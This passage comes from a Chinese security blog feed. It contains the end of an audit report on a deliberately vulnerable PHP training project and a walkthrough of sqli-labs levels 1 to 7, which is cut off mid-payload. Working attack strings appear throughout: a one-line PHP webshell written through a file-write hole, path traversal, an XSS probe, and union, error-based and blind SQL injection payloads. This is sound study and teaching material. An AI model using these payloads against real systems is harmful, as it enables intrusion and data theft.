命令执行 - /modules/command/index.php"></a><strong>VULU-001 - 命令执行 - <code>/modules/command/index.php</code></strong></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/command/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第6行：<code>$host = $_GET[&#39;host&#39;];</code> 第7行：<code>$cmd = &#39;ping -n 1 &#39; . $host;</code> 第8行：<code>$output = shell_exec($cmd);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">可以看到用户输入的<code>host</code>参数没有进行任何过滤直接拼接到第七行的<code>ping</code>命令之后，又在第八行中直接执行系统命令，这导致用户可以输入任何系统命令来获取系统信息。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">使用白名单验证<code>host</code>参数，或使用<code>escapeshellarg()</code>函数进行转义。</td></tr></tbody></table></li><li><h4 id="VULN-002-HTTP-header注入-modules-cors-index-php"><a href="#VULN-002-HTTP-header注入-modules-cors-index-php" class="headerlink" title="VULN-002 - HTTP header注入 - /modules/cors/index.php"></a><strong>VULN-002 - HTTP header注入 - <code>/modules/cors/index.php</code></strong></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>modules/cors/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第5行：<code>header(&#39;Access-Control-Allow-Origin: &#39; . $_GET[&#39;origin&#39;]);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left"><code>Origin</code>头值直接来自用户输入，可能导致HTTP响应头注入攻击，（例如攻击者构造恶意网站，窃取用户信息。）</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">验证<code>origin</code>是否为允许的域名，或使用白名单机制。</td></tr></tbody></table></li><li><h4 id="VULN-003-文件读取-modules-doubleparse-index-php"><a href="#VULN-003-文件读取-modules-doubleparse-index-php" class="headerlink" title="VULN-003 - 文件读取 - /modules/doubleparse/index.php"></a><strong>VULN-003 - 文件读取 - <code>/modules/doubleparse/index.php</code></strong></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/doubleparse/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第12行：<code>$fileParam = $_GET[&#39;file&#39;]??&#39;&#39;;</code> 第15行：<code>$base = __DIR__ . &#39;/../../data/&#39;;</code> 第21行：<code>$target = $base . $decodedTwice;</code> 第23行：<code>$output = file_get_contents($target);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left"><code>$_GET[&#39;file&#39;]</code>从URL的GET参数中获取名为<code>&#39;file&#39;</code>的值，<code>$decodedTwice</code>变量中存储的是经过两次解码的用户输入路径，之后将基础路径<code>$base</code>与用户输入的文件名直接拼接，如果用户输入包含<code>../</code>，可能跳出限制目录。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">使用白名单限制可访问的文件，加强路径遍历检查。</td></tr></tbody></table></li><li><h4 id="VULN-004-文件包含-modules-fi-index-php"><a href="#VULN-004-文件包含-modules-fi-index-php" class="headerlink" title="VULN-004 - 文件包含 - /modules/fi/index.php"></a>VULN-004 - 文件包含 - <code>/modules/fi/index.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/fi/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第4行：<code>$page = $_GET[&#39;page&#39;] ?? &#39;home&#39;; </code>第29行：<code> $path = $page;</code> 第31行：<code>@include $path;</code> 第33行：<code>include __DIR__ . &#39;/../../pages/&#39; . $path . &#39;.php&#39;;</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">从<code>@include $path</code>和<code>@include __DIR__ . &#39;/../../pages/&#39; . $path . &#39;.php&#39;;</code>我们可以知道包含文件<code>$path</code>是来自用户可控的输入的，这就导致任意文件包含和代码执行。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">实现严格的白名单机制，禁止动态包含用户可控文件。</td></tr></tbody></table></li><li><h4 id="VULN-005-XSS漏洞-modules-hpp-index-php"><a href="#VULN-005-XSS漏洞-modules-hpp-index-php" class="headerlink" title="VULN-005 - XSS漏洞 - /modules/hpp/index.php"></a>VULN-005 - XSS漏洞 - <code>/modules/hpp/index.php</code></h4><p><strong>风险等级：中危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/hpp/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第16行：<code>print_r $msg . &#39; 角色列表接收为: &#39; . h(print_r($roles, true));</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户输入直接输出到页面，存在跨站脚本攻击风险。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">对所有用户输出进行HTML实体编码。</td></tr></tbody></table></li><li><h4 id="VULN-006-XSS漏洞-modules-idor-user-php"><a href="#VULN-006-XSS漏洞-modules-idor-user-php" class="headerlink" title="VULN-006 - XSS漏洞 - /modules/idor/user.php"></a>VULN-006 - XSS漏洞 - <code>/modules/idor/user.php</code></h4><p><strong>风险等级：中危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/idor/user.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第7行：<code>$user = $pdo-&gt;query(&quot;SELECT ... WHERE id=&quot; . $id)-&gt;fetch();</code> 存在print_r输出</td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">存在SQL注入和XSS双重风险，用户数据未经验证直接输出。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">使用参数化查询，对输出进行编码。</td></tr></tbody></table></li><li><h4 id="VULN-007-协议注入-modules-mail-index-php"><a href="#VULN-007-协议注入-modules-mail-index-php" class="headerlink" title="VULN-007 - 协议注入 - /modules/mail/index.php"></a>VULN-007 - 协议注入 - <code>/modules/mail/index.php</code></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/mail/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第11行：<code>$ok = mail($to, $subj, $body, $headers);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">邮件头信息直接来自用户输入，可被用于邮件头注入攻击。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">验证邮件地址格式，过滤特殊字符。</td></tr></tbody></table></li><li><h4 id="VULN-008-extract滥用-modules-override-index-php"><a href="#VULN-008-extract滥用-modules-override-index-php" class="headerlink" title="VULN-008 - extract滥用 - /modules/override/index.php"></a>VULN-008 - extract滥用 - <code>/modules/override/index.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/override/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第19行：<code>extract($_GET);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left"><code>extract()</code>函数直接处理<code>$_GET</code>数组，导致变量覆盖漏洞。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">避免使用<code>extract()</code>函数，或使用EXTR_SKIP等安全模式。</td></tr></tbody></table></li><li><h4 id="VULN-009-文件读取-modules-path-index-php"><a href="#VULN-009-文件读取-modules-path-index-php" class="headerlink" title="VULN-009 - 文件读取 - /modules/path/index.php"></a>VULN-009 - 文件读取 - <code>/modules/path/index.php</code></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/path/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第9行：<code>$content = file_get_contents($target);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户可控文件路径，可读取服务器敏感文件。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">限制文件访问范围，使用绝对路径检查。</td></tr></tbody></table></li><li><h4 id="VULN-010-远程代码执行-modules-rce-eval-php"><a href="#VULN-010-远程代码执行-modules-rce-eval-php" class="headerlink" title="VULN-010 - 远程代码执行 - /modules/rce/eval.php"></a>VULN-010 - 远程代码执行 - <code>/modules/rce/eval.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/rce/eval.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第13行：<code>eval($code);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户输入直接作为PHP代码执行，极度危险。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left"><strong>绝对禁止</strong>在生产环境使用eval函数。</td></tr></tbody></table></li><li><h4 id="VULN-011-SQL注入-modules-sqli-index-php"><a href="#VULN-011-SQL注入-modules-sqli-index-php" class="headerlink" title="VULN-011 - SQL注入 - /modules/sqli/index.php"></a>VULN-011 - SQL注入 - <code>/modules/sqli/index.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/sqli/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第15行：<code>$sql2 = &quot;SELECT ... WHERE username=&#39;&quot; . $q . &quot;&#39;&quot;;</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户输入直接拼接SQL查询，存在SQL注入漏洞。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">使用参数化查询（PDO预处理语句）。</td></tr></tbody></table></li><li><h4 id="VULN-012-反序列化漏洞-modules-unserialize-index-php"><a href="#VULN-012-反序列化漏洞-modules-unserialize-index-php" class="headerlink" title="VULN-012 - 反序列化漏洞 - /modules/unserialize/index.php"></a>VULN-012 - 反序列化漏洞 - <code>/modules/unserialize/index.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/unserialize/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第17行：<code>unserialize($data);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">反序列化用户可控数据，可能导致对象注入攻击。</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">避免反序列化用户输入，使用JSON等安全格式。</td></tr></tbody></table></li><li><h4 id="VULN-013-文件上传漏洞-modules-upload-index-php"><a href="#VULN-013-文件上传漏洞-modules-upload-index-php" class="headerlink" title="VULN-013 - 文件上传漏洞 - /modules/upload/index.php"></a>VULN-013 - 文件上传漏洞 - <code>/modules/upload/index.php</code></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/upload/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第5行：<code>$f = $_FILES[&#39;file&#39;];</code> 第22行：<code>$msg = &#39;&lt;span class=&quot;danger&quot;&gt;上传错误代码：&#39; . $f[&#39;error&#39;] . &#39;&lt;/span&gt;&#39;;</code> 第38行：<code>echo &#39;&lt;p&gt;&#39; . $msg . &#39;&lt;/p&gt;&#39;;</code> 存在<code>move_uploaded_file</code>函数调用</td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">文件上传功能存在双重风险：1. 未对上传文件类型进行严格验证，可能导致恶意文件上传；2. 错误信息直接输出到页面，存在XSS漏洞。</td></tr><tr><td align="left"><strong>漏洞验证</strong></td><td align="left">1. 上传webshell文件测试是否被拦截 2. 构造特殊文件名触发错误信息，验证XSS漏洞</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">1. 限制上传文件类型（白名单机制） 2. 检查文件内容而不仅是扩展名 3. 将上传文件存储在Web目录外 4. 对错误信息进行HTML编码：<code>echo &#39;&lt;p&gt;&#39; . htmlspecialchars($msg) . &#39;&lt;/p&gt;&#39;;</code></td></tr></tbody></table></li><li><h4 id="VULN-014-任意文件读取-modules-wrapper-index-php"><a href="#VULN-014-任意文件读取-modules-wrapper-index-php" class="headerlink" title="VULN-014 - 任意文件读取 - /modules/wrapper/index.php"></a>VULN-014 - 任意文件读取 - <code>/modules/wrapper/index.php</code></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/modules/wrapper/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第12行：<code>$path = $_GET[&#39;path&#39;]??&#39;index.php&#39;;</code> 第16行：<code>$wrapper = &#39;php://filter/convert.base64-encode/resource=&#39;. $path;</code> 第17行：<code>$data = file_get_contents($wrapper);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">通过PHP包装器漏洞，攻击者可读取服务器任意文件的base64编码内容，绕过某些文件读取限制。</td></tr><tr><td align="left"><strong>漏洞验证</strong></td><td align="left">访问：<code>http://target.com/wrapper/index.php?path=../../config/db.php</code></td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">1. 禁用危险的PHP包装器 2. 实现严格的文件路径白名单 3. 使用<code>realpath()</code>检查路径是否在允许范围内</td></tr></tbody></table></li><li><h4 id="VULN-015-任意文件写入-modules-write-index-php"><a href="#VULN-015-任意文件写入-modules-write-index-php" class="headerlink" title="VULN-015 - 任意文件写入 - /modules/write/index.php"></a>VULN-015 - 任意文件写入 - <code>/modules/write/index.php</code></h4><p><strong>风险等级：严重</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left">**漏洞文件</td><td align="left"><code>/modules/write/index.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第8行：<code>$path = $_POST[&#39;path&#39;]??&#39;&#39;;</code> 第9行：<code>$content = $_POST[&#39;content&#39;]??&#39;&#39;;</code> 第17行：<code>$bytes = file_put_contents($path, $content, $flags);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户可完全控制写入路径和内容，可直接写入webshell到服务器。</td></tr><tr><td align="left"><strong>漏洞验证</strong></td><td align="left">POST请求：<code>path=shell.php&amp;content=&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code></td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">1. <strong>绝对禁止</strong>此类功能在生产环境使用 2. 如必须使用，限制路径到特定安全目录 3. 验证文件内容安全性</td></tr></tbody></table></li><li><h4 id="VULN-016-反射型XSS-modules-xss-reflected-php"><a href="#VULN-016-反射型XSS-modules-xss-reflected-php" class="headerlink" title="VULN-016 - 反射型XSS - /modules/xss/reflected.php"></a>VULN-016 - 反射型XSS - <code>/modules/xss/reflected.php</code></h4><p><strong>风险等级：中危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>modules/xss/reflected.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第21行：<code>echo $_GET[&#39;q&#39;];</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">用户输入直接输出到页面，存在反射型XSS漏洞。</td></tr><tr><td align="left"><strong>漏洞验证</strong></td><td align="left">访问：<code>http://target.com/xss/reflected.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">使用<code>htmlspecialchars()</code>函数编码输出：<code>echo htmlspecialchars($_GET[&#39;q&#39;], ENT_QUOTES, &#39;UTF-8&#39;);</code></td></tr></tbody></table></li><li><h4 id="VULN-017-配置写入漏洞-setup-install-php"><a href="#VULN-017-配置写入漏洞-setup-install-php" class="headerlink" title="VULN-017 - 配置写入漏洞 - /setup/install.php"></a>VULN-017 - 配置写入漏洞 - <code>/setup/install.php</code></h4><p><strong>风险等级：高危</strong></p><table><thead><tr><th align="left">项目</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>漏洞文件</strong></td><td align="left"><code>/setup/install.php</code></td></tr><tr><td align="left"><strong>相关代码</strong></td><td align="left">第10-14行：获取数据库配置参数 第57行：拼接配置文件内容 第64行：<code>file_put_contents(__DIR__ . &#39;/../config/config.inc.php&#39;, $configPHP);</code></td></tr><tr><td align="left"><strong>漏洞描述</strong></td><td align="left">安装脚本将用户输入的数据库配置写入配置文件，虽然使用了<code>addslashes</code>但保护不足，可能被用于路径遍历或配置文件污染。</td></tr><tr><td align="left"><strong>漏洞验证</strong></td><td align="left">在安装过程中注入恶意配置参数</td></tr><tr><td align="left"><strong>修复建议</strong></td><td align="left">1. 安装完成后立即删除或禁用<code>install.php</code> 2. 对输入参数进行严格验证 3. 设置配置文件权限为644 4. 使用更安全的序列化方式存储配置</td></tr></tbody></table></li></ul><h2 id="修复建议汇总"><a href="#修复建议汇总" class="headerlink" title="修复建议汇总"></a>修复建议汇总</h2><h3 id="紧急（严重）"><a href="#紧急（严重）" class="headerlink" title="紧急（严重）"></a>紧急（严重）</h3><ol><li><strong>VULN-001, VULN-010</strong>：立即移除或严格限制命令执行和eval功能</li><li><strong>VULN-004, VULN-008, VULN-012</strong>：修复文件包含、变量覆盖和反序列化漏洞</li><li><strong>VULN-011</strong>：使用参数化查询修复SQL注入</li><li><strong>VULN-015</strong>：立即禁用任意文件写入功能</li></ol><h3 id="重要（高危）"><a href="#重要（高危）" class="headerlink" title="重要（高危）"></a>重要（高危）</h3><ol><li><strong>VULN-002, VULN-007</strong>：修复HTTP头注入和邮件注入</li><li><strong>VULN-003, VULN-009</strong>：加强文件访问控制</li><li><strong>VULN-013</strong>：加强文件上传验证机制</li><li><strong>VULN-014</strong>：修复任意文件读取漏洞</li><li><strong>VULN-017</strong>：加固安装脚本安全性</li></ol><h3 id="常规（中危）"><a href="#常规（中危）" class="headerlink" title="常规（中危）"></a>常规（中危）</h3><ol><li><strong>VULN-005, VULN-006</strong>：实现输出编码，防止XSS攻击</li><li><strong>VULN-016</strong>：修复反射型XSS漏洞</li></ol><h2 id="整体风险评估"><a href="#整体风险评估" class="headerlink" title="整体风险评估"></a>整体风险评估</h2><p><strong>风险极高</strong> - 该项目存在严重的安全问题，多个漏洞可导致服务器被完全控制。建议立即停止生产环境使用，完成所有高危漏洞修复后再重新部署，（但用于学习熟练操作为主）。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs靶场（1-10）</title>
      <link href="/2025/11/04/sql-libs%E9%9D%B6%E5%9C%BA%EF%BC%881-10%EF%BC%89/"/>
      <url>/2025/11/04/sql-libs%E9%9D%B6%E5%9C%BA%EF%BC%881-10%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="sql-libs靶场（1-10）"><a href="#sql-libs靶场（1-10）" class="headerlink" title="sql-libs靶场（1-10）"></a>sql-libs靶场（1-10）</h1><p>上篇文章我们介绍了SQL注入的基础知识，为了更好掌握SQL注入的基础知识，我将通过sqli-libs靶场来提升这方面知识的熟练度下面是对1-22关基础关的通关过程。（需要注意的在本篇文章里，我只够建了较为基础的Payload，例如查看数据库名字、版本号等，具体和复杂的Payload可以参考<a href="https://moshsasa.github.io/2025/11/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">SQL 注入基础</a>）</p><h2 id="1-Less-1"><a href="#1-Less-1" class="headerlink" title="1. Less-1"></a>1. Less-1</h2><p><img src="/../images/sql-libs/1.png" alt="1"></p><ol><li>可以看到初始页面这里提示我我们输入数字值的ID作为参数，所以我们输入<code>?id=1</code>或<code>?id=1</code>以此类推。</li></ol><p><img src="/../images/sql-libs/2.png" alt="2"></p><p><img src="/../images/sql-libs/3.png" alt="3"></p><ul><li>可以注意到不同的参数<code>1，2</code>会所返回的内容也不同，由此可以判断我们输入的参数是带如到数据库里面查询的。</li></ul><ol start="2"><li>接下来我们需要判断SQL语句是字符型还是数字型，因为它关系到之后我们所构建的Payload是否正确（数字型是不需要闭合的）。</li></ol><ul><li><p><strong>数字型注入</strong>的参数在SQL语句中直接被当作数字使用，<strong>通常没有单引号包裹</strong>。</p></li><li><p><strong>字符型注入</strong>的参数在SQL语句中<strong>被单引号（有时是双引号）包裹。</strong></p></li></ul><p>这里我们使用注释符号<code>--+</code>注释掉后面的引号。</p><p><img src="/../images/sql-libs/4.png" alt="4"></p><ul><li>可以看到页面仍然是正常的没有报错，所以我已确定是字符型注入。</li></ul><ol start="3"><li>根据上面的实验可以发现页面时有回显的，所以我们优先考虑联合注入。</li></ol><ul><li>根据上篇文章中介绍的联合查询的步骤来，首先我们需要判断列数：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ORDER BY n(n = 1, 2, 3, 4......)--+</span></span><br></pre></td></tr></table></figure><ul><li>结果判断之后我们可以发现在n&#x3D;3时页面显示正常但是在n&#x3D;4时页面出现了报错。</li></ul><p><img src="/../images/sql-libs/5.png" alt="5"></p><p><img src="/../images/sql-libs/6.png" alt="6"></p><ul><li><p>所以我们可以发现列数一共时4，那么接下来就要使用<code>UNION SELECT</code>来判断回显位。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/7.png" alt="7"></p><ul><li><p>由此我们可以得到第二位和第三位都是回显位，接下来就简单了，我们可以直接开始获取数据库数据了，例如我们这里查看数据库的基本信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,database(),version()--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/8.png" alt="8"></p><h2 id="2-Less-2"><a href="#2-Less-2" class="headerlink" title="2. Less-2"></a>2. Less-2</h2><ul><li><p>和第一关是一样进行判断，当我们输入单引号或者双引号可以看到报错，而且当我们分别输入<code>?id=1 AND 1=1 --+</code>和<code>?id=1 AND 1=2 --+</code>时前者没有报错，而后者返回为空，所以我们可以确定为数字型。那接下来的步骤和我们第一关是差不多的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> n(n <span class="operator">=</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4.</span>.....)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span> ?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,database(),version()<span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/9.png" alt="9"></p><p><img src="/../images/sql-libs/10.png" alt="10"></p><h2 id="3-Less-3"><a href="#3-Less-3" class="headerlink" title="3. Less-3"></a>3. Less-3</h2><ul><li>这里我们依旧尝试<code>?id=1&#39;</code>。</li></ul><p><img src="/../images/sql-libs/11.png" alt="11"></p><ul><li><p>可以发现报错中出现了括号，这是一个细节，我们可以由此推断出在语句中可能存在<code>WHERE id = ()</code>这样带有括号的语法，所以当我们输入<code>?id=1&#39;</code>时，语句可能就变成了<code>WHERE id = (&#39;&#39;&#39;)</code>从而报错，那么我们不妨尝试将前面的括号也闭合掉：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/12.png" alt="12"></p><ul><li><p>可以看到这里页面显示正常，那么之后的步骤就简单了，与前两关的步骤类似，我们可以直接通过联合查询爆出数据库信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) ORDER BY n(n = 1, 2, 3, 4......)--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) UNION SELECT 1,2,3--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) UNION SELECT 1,database(),version()--+</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="4-Less-4"><a href="#4-Less-4" class="headerlink" title="4. Less-4"></a>4. Less-4</h2><ul><li>在我们起初尝试的时候，可以发现我们这次输入<code>?id=1&#39;</code>的时候页面并没有报错，很有可能对我们用户输入进行了过滤，那我们首先能想到的就是用双引号来替代了。</li></ul><p><img src="/../images/sql-libs/13.png" alt="13"></p><ul><li><p>可以看到使用双引号果然可以，且可以看到这里的报错信息又出现了括号，那么这样就和上一关一模一样了，只需要把单引号换成双引号即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) UNION SELECT 1,database(),version()--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-Less-5"><a href="#5-Less-5" class="headerlink" title="5. Less-5"></a>5. Less-5</h2><ul><li>来到第五关我们发现在输入ID&#x3D;1之后页面并没有显示别的东西，也就是说页面并没有回显，这个时候联合注入就没有用了。</li></ul><p><img src="/../images/sql-libs/14.png" alt="14"></p><ul><li><p>但是我们可以发现当输入<code>?id=1&#39;</code>时页面依旧有报错，那么我们不妨尝试一下报错注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/15.png" alt="15"></p><ul><li>不出所料的，我们依旧拿到了数据库的信息。</li></ul><h2 id="6-Less-6"><a href="#6-Less-6" class="headerlink" title="6. Less-6"></a>6. Less-6</h2><ul><li>在第六关中我们可以发现在输入<code>?id=1</code>之后页面也是没有回显，输入<code>?id=1&#39;</code>之后页面也并没有报错，可以猜测是否<code>&#39;</code>存在被过滤的可能，所以我们尝试<code>?id=1&quot;</code>，可以发现页面出现了报错信息。</li></ul><p><img src="/../images/sql-libs/16.png" alt="16"></p><ul><li><p>那接下来的步骤就和第五关类似了，我们可以直接通过报错注入来查看数据库的信息。（由于在第五关已经使用了<code>updatexml()</code>函数，所以这里我们可以换成<code>extractvalue()</code>函数试试。）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot; AND extractvalue(1, (concat(0x7e, (SELECT database()), 0x7e))) --+</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/sql-libs/17.png" alt="17"></p><h2 id="7-Less-7"><a href="#7-Less-7" class="headerlink" title="7. Less-7"></a>7. Less-7</h2><ul><li><p>来到第七关我们可以发现，在进行简单的测试之后，无论我们尝试<code>?id=1</code>，或者<code>?id=1&#39;</code>页面要么是没有回显，有么就是或报错但无具体内容，这导致我们无法通过联合注入和报错注入来解决问题，所以我们可以试试布尔盲注。</p></li><li><p>首先我们还是先找到这一关的闭合方式，然后我输入<code>id=1&#39;--+</code>时报错，这时候我们可以输入<code>id=1&#39;)--+</code>发现依然报错，之时我试试是不是双括号输入<code>id=1&#39;))--+</code>，发现页面显示正常。</p></li><li><p>接下来我们就根据布尔盲注来获取数据库信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) AND length(database()) = 8 